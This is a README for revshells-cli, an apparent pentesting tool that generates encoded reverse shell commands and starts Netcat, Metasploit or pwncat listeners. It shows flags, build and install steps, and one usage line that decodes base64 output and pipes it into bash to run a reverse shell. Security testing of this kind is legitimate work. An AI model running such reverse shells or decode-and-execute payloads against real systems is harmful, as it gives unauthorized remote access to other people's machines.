# revshells-cli: A Reverse Shell Command Generator and Listener Manager

## Description
revshells-cli is a versatile tool designed for cybersecurity professionals. It generates customizable reverse shell commands, supports multiple encoding options, and manages listeners in different modes (CLI/GUI). It can handle various shell types and listeners such as Netcat, Metasploit, and pwncat. It also features automatic IP address fetching from network interfaces. It was inspired by revshells.com.  
NOTE: I have not done any other testing besides on Kali with Xfce for now and you will need to install something like xclip for the clipboard option to work. 

## Usage
```
Usage of ./revshells-cli_linux_amd64:
  -L    List all available shells
  -e string
        Encoding method: base64, 2xbase64, or urlenc (default "none")
  -i string
        the IP address (default "tun0")
  -l string
        Type of listener (nc, msf, pwncat)
  -mode string
        Mode for listener (gui/cli) (default "gui")
  -p string
        the port number (default "4444")
  -q    Only output the shell code to stdout for use in other scripts
        Ignores -l flag if used
  -r string
        Choose the reverse shell format (default "bash")
  -s string
        the shell to use (default "bash")
  -v    Show version and exit
```

## Installation and Setup
1. Clone the repository:
   ```
   git clone https://github.com/shadowraven65/revshells-cli.git
   ```

2. Compile the program:
  - You will need `github.com/atotto/clipboard` 
    ```
    go init revshells-cli  
    ```
    ```
    go get github.com/atotto/clipboard
    ```
  - Then you can build
    ```
    go build -o revshell-cli
    ```
3. Or download the latest release and run it
  - https://github.com/shadowraven65/revshells-cli/releases/latest/

  - Kali and Parrot users can use this as an install option.
  ```
  sudo curl -L https://github.com/shadowraven65/revshells-cli/releases/latest/download/revshells-cli_linux_amd64 -o /usr/local/bin/revshells-cli
  ```

## Usage
- **Generate Reverse Shell Commands:**
  ```
  revshells-cli -s bash -i tun0 -p 4444 -r bash
  ```
- **Use with Quiet Mode**
  ```
  echo "echo '$(revshells-cli -e base64 -q)' | base64 -d | bash" 
  ```

- **Set Up Listeners (examples):**
  - **CLI will open in multiplexer where GUI will open in new terminal emulator**
  - Netcat:
    ```
    revshells-cli -l nc -mode cli
    ```
  - Metasploit:
    ```
    revshells-cli -l msf -mode gui
    ```
  - pwncat:
    ```
    revshells-cli -l pwncat -mode cli
    ```

## Features
- **Supported Shell Types:** Bash, Telnet, Crystal, etc.
- **Encoding Options:** Base64, double Base64, URL encoding.
- **Automatic IP Address Fetching:** Fetches IP from 'tun0' or 'eth0' or defaults to localhost.

## Configuration
- Customize the `.config/revshells-cli.json` file for personal settings.
- Make sure you use {session} where in needs to go for your multiplexers session name
- Example configuration:
  ```
  {
    "gui_listener": "x-terminal-emulator -e",
    "cli_listener": "tmux new -d -s {session}",
    "custom_shells": {
      "your_custom_shell": "command_format_here"
    }
  }
  ```

## Contributing
- Contributions are welcome. Please submit pull requests or report issues for improvements.

## License
- MIT
